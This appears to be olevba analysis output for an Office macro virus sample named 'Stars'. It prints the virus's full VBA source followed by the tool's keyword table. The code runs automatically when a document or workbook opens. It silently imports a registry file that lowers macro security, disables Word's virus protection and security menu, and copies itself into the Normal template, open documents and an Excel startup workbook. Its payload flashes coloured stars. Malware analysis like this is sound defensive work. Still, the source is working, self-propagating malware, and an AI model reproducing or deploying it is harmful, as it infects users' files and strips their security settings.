olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Stars
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Stars - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Stars
' Office Virus (Infects Word And Excel)
' By The WalruS 11/00 v1.00

Private Sub Workbook_Deactivate()
    On Error Resume Next
    With Application: .DisplayAlerts = 0: .ScreenUpdating = 0: .DisplayStatusBar = 0: .UserName = "Stars": End With
    Open "C:\Protection.reg" For Output As #1
        Print #1, "REGEDIT4"
        Print #1, ""
        Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
        Print #1, """Options6""=dword:00000000"
        Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
        Print #1, """Level""=dword:00000001"
    Close #1
    Shell "regedit /s C:\Protection.reg", vbHide: Kill ("C:\Protection.reg")
    Installed = Dir(Application.StartupPath & "\Book1.")
    If Installed = "" Then
        Open "C:\Windows\Stars.drv" For Output As #1: Print #1, VBProject.vbcomponents(1).CodeModule.Lines(1, 130): Close #1
        VBAProject.ThisWorkbook.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    End If
    Set ActiveWB = ActiveWorkbook.VBProject.vbcomponents("ThisWorkbook").CodeModule: Set ThisWB = ThisWorkbook.VBProject.vbcomponents("ThisWorkbook").CodeModule
    If ActiveWB.Lines(1, 1) <> "' Stars" Then
        ActiveWB.DeleteLines 1, ActiveWB.CountofLines
        ActiveWB.AddFromFile ("C:\Windows\Stars.drv")
        ActiveWorkbook.Save
    End If
    Set Wordinfect = CreateObject("Word.Application")
    Set nor = Wordinfect.NormalTemplate.VBProject.vbcomponents(1).CodeModule
    If nor.Lines(1, 1) <> "' Stars" Then
    Wordinfect.Options.SaveNormalPrompt = False
    nor.DeleteLines 1, nor.CountofLines
    nor.InsertLines 1, ThisWB.Lines(1, ThisWB.CountofLines)
    End If
    Wordinfect.Quit
End Sub

Private Sub Document_Open()
    On Error Resume Next
    If Second(Now) > 55 Then Call WDPayload
    With Application: .DisplayAlerts = 0: .ScreenUpdating = 0: .DisplayStatusBar = 0: .UserName = "Stars": End With
    With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: .ConfirmConversions = 0: End With
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
    Set nor = NormalTemplate.VBProject.vbcomponents(1).CodeModule: Set doc = ActiveDocument.VBProject.vbcomponents(1).CodeModule
    Open "C:\Windows\Stars.drv" For Output As #1: Print #1, VBProject.vbcomponents(1).CodeModule.Lines(1, 130): Close #1
    If nor.Lines(1, 1) <> "' Stars" Then
        nor.DeleteLines 1, nor.CountofLines
        nor.AddFromFile ("C:\Windows\Stars.drv")
        NormalTemplate.Save
    ElseIf doc.Lines(1, 1) <> "' Stars" Then
        doc.DeleteLines 1, doc.CountofLines
        doc.AddFromFile ("C:\Windows\Stars.drv")
    End If
    NormalTemplate.Saved = True
    If ActiveDocument.Saved <> True Then ActiveDocument.Save
    Set xlinfect = CreateObject("Excel.Application")
    Infected = Dir(xlinfect.Application.StartupPath & "\Book1.")
    If Infected = "" Then
            Set Book1Inf = xlinfect.Workbooks.Add
            Book1Inf.VBProject.vbcomponents("ThisWorkbook").CodeModule.InsertLines 1, nor.Lines(1, nor.CountofLines)
            Book1Inf.SaveAs xlinfect.Application.StartupPath & "\Book1."
            Book1Inf.Close
    End If
    xlinfect.Quit
End Sub

Private Sub Workbook_Open()
    If Second(Now) > 55 Then
    On Error Resume Next
    Randomize
    StarWidth = 25: StarHeight = 25
    For i = 1 To 10
        TopPos = Rnd() * (ActiveWindow.UsableHeight - StarHeight)
        LeftPos = Rnd() * (ActiveWindow.UsableWidth - StarWidth)
        Set NewStar = ActiveSheet.Shapes.AddShape _
          (msoShape4pointStar, LeftPos, TopPos, StarWidth, StarHeight)
        NewStar.Fill.ForeColor.SchemeColor = Int(Rnd() * 56)
        Application.Wait Now + TimeValue("00:00:01")
        DoEvents
    Next i
    Application.Wait Now + TimeValue("00:00:02")
Set myShapes = Worksheets(1).Shapes
    For Each shp In myShapes
        If Left(shp.Name, 9) = "AutoShape" Then
            shp.Delete
            Application.Wait Now + TimeValue("00:00:01")
        End If
    Next
    Worksheets(1).Shapes("Message").Visible = True
    End If
End Sub

Private Sub WDPayload()
    On Error Resume Next
    Randomize
    StarWidth = 25: StarHeight = 25
    For i = 1 To 10
        TopPos = Rnd() * (ActiveWindow.UsableHeight - StarHeight)
        LeftPos = Rnd() * (ActiveWindow.UsableWidth - StarWidth)
        Set NewStar = ActiveDocument.Shapes.AddShape _
          (msoShape4pointStar, LeftPos, TopPos, StarWidth, StarHeight)
        NewStar.Fill.Visible = msoTrue
        NewStar.Fill.Solid
        NewStar.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
        Oldtimer1 = Timer
        While (Timer < Oldtimer1 + 1)
        Wend
        DoEvents
    Next i
        Oldtimer2 = Timer
        While (Timer < Oldtimer2 + 2)
        Wend
Set myShapes = ActiveDocument.Shapes
    For Each shp In myShapes
        If Left(shp.Name, 9) = "AutoShape" Then
            shp.Delete
        Oldtimer3 = Timer
        While (Timer < Oldtimer3 + 1)
        Wend
        End If
    Next
    ActiveDocument.Shapes("Message").Visible = True
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Protection.reg      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

